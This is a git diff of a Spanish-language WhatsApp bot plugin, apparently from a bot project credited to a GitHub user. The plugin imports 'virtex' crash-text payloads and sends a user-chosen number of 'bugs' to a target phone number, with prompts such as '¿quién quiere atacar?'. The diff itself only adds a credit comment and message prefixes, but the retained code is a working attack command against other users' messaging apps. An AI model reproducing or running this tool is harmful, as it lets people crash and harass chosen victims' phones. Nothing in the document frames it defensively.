@@ -1,3 +1,5 @@
+//By https://github.com/DIEGO-OFC
+
 import virtex from "../virtex/index.js";
 
 let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) => {
@@ -5,9 +7,9 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) =
         global.dfail('premium', m, conn)
         throw false
     }
-    if (!text) throw `uhm... ¿quién quiere atacar?\n ejemplo de uso:\n *${usedPrefix + command}* número\n ejemplo: *${usedPrefix + command}* +57*******`;
+    if (!text) throw `[❕] uhm... ¿quién quiere atacar?\n ejemplo de uso:\n *${usedPrefix + command}* número\n ejemplo: *${usedPrefix + command}* +57*******`;
     let [orang, jumlah] = text.split(',')
-    if (!jumlah) throw '.\n\nintroduce la cantidad\n.sbug +38999999999...., 10'
+    if (!jumlah) throw '.\n\n[❕] introduce la cantidad\n.sbug +38999999999...., 10'
     m.reply('_Procesando..._')
     let who
     try {
@@ -29,7 +31,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) =
                 }
             })
         }
-        conn.reply(m.chat, `enviando con éxito un bug a @${who.split('@')[0]}`, m, { mentions: [who] })
+        conn.reply(m.chat, `[❕] enviando con éxito un bug a @${who.split('@')[0]}`, m, { mentions: [who] })
     } catch (e) {
         console.error(e)
         throw e
